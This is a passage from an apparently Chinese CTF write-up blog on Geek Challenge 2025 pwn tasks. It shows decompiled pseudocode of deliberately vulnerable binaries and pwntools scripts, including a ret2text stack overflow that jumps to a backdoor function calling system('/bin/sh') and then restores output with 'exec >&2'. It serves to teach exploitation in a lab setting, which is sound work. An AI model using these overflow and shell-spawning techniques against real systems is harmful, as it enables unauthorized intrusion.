</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="mission-calculator">Mission Calculator
</h3><h4 id="解题流程-1">解题流程
</h4><p>这题不用查保护，就是一个单纯的计算题，直接写一个for全算出来发回去就行</p>
<h4 id="exp-1">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="c1"># io = process(&#39;./calc&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;geek.ctfplus.cn&#34;</span><span class="p">,</span><span class="mi">31128</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;...&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">calc</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">calc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">calc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">result</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="mission-cipher-text">Mission Cipher Text
</h3><h4 id="解题流程-2">解题流程
</h4><p>查保护
<img src="/p/geek-challenge-2025-wp/image-1.png"
	width="470"
	height="224"
	srcset="/p/geek-challenge-2025-wp/image-1_hu_b853e396d6723df8.png 480w, /p/geek-challenge-2025-wp/image-1_hu_242de95398fb6474.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="209"
		data-flex-basis="503px"
	
>
查伪代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">banner</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">menu</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="nf">readchoice</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">output_history</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">submit_feedback</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">readchoice</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-20h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">atoi</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">size_t</span> <span class="nf">submit_feedback</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">_BYTE</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-20h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Please enter your feedback:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">close</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">fwrite</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x1B</span><span class="s">[1m</span><span class="se">\x1B</span><span class="s">[95mwe are here waiting for you</span><span class="se">\x1B</span><span class="s">[0m</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">,</span> <span class="mh">0x29uLL</span><span class="p">,</span> <span class="n">stderr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">b4ckd00r</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>有后门函数，可以ret2text，先到submit_feedback函数里构造溢出然后ret到后门函数，但是注意到submit_feedback里执行了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">close</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>关闭了标准输出，还得手动打开</p>
<h4 id="exp-2">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="c1"># io = process(&#39;./text&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;geek.ctfplus.cn&#39;</span><span class="p">,</span><span class="mi">31370</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">backdoor_addr</span> <span class="o">=</span> <span class="mh">0x00000000004014AF</span>
</span></span><span class="line"><span class="cl"><span class="n">ret_addr</span> <span class="o">=</span> <span class="mh">0x000000000040101a</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;choice &gt;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x28</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">backdoor_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;exec &gt;&amp;2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="mission-exception-registration">Mission Exception Registration
</h3><h4 id="解题流程-3">解题流程
</h4><p>查保护
<img src="/p/geek-challenge-2025-wp/image-2.png"
	width="436"
	height="222"
	srcset="/p/geek-challenge-2025-wp/image-2_hu_ad10ce454445e22d.png 480w, /p/geek-challenge-2025-wp/image-2_hu_8a05e4b62a1d24e5.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="196"
		data-flex-basis="471px"
	
>
查伪代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">Input</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">banner</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">user_init</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">menu</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">Input</span> <span class="o">=</span> <span class="nf">read_int</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">Input</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">Input</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nl">LABEL_13</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Invalid choice.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">Input</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">view_resources</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">Input</span> <span class="o">&gt;</span> <span class="mi">3</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">LABEL_13</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">Input</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">register_user</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">Input</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="k">goto</span> <span class="n">LABEL_13</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">submit_feedback</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="nf">user_init</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span> <span class="c1">// rax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">13</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x10uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x20uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">read_int</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">80</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-50h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">atoi</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="nf">view_resources</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">login</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;WELCOME, USER.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptr</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="s">&#34;Recently, our researchers successfully captured and reproduced the matrix of human thought activity and used it as&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="s">&#34; a model to successfully create an independent personality matrix from scratch. This would be a great technologica&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="s">&#34;l advancement. However, the Scientific Ethics Committee believes that this may be unethical and is currently evalu&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="s">&#34;ating the risks of this technology.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;WELCOME, ADMINISTRATOR.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">register_user</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;You have already registered.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Please enter your name:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">ptr</span><span class="p">,</span> <span class="mh">0x10uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Please enter your password:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">16</span><span class="p">,</span> <span class="mh">0x28uLL</span><span class="p">);</span>
